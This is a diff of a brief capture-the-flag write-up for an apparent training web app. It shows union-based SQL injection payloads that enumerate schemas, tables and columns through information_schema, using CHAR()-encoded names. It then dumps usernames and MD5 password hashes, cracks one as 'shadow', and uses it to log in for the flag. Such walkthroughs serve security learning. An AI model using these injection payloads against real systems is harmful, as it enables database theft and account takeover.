@@ -1,13 +1,19 @@
+in /?page=signin
+we can go on search member page to see all databases
+
 1 UNION SELECT 1, schema_name FROM information_schema.schemata;
-Member_Brute_Force
+we can see a schema named Member_Brute_Force
+
 1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
-db_default
+it has one table named db_default
+
 1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)  AND TABLE_NAME = CHAR(100,98,95,100,101,102,97,117,108,116)
-username password
-1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
+it has two colums username and password
+
+1 UNION SELECT username, password FROM Member_Brute_Force.db_default
 First name: root
 Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
 First name: admin
 Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
-md5 of shadow
-The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 
+the password is md5 of shadow
+we can return to /?page=signin and get the flag
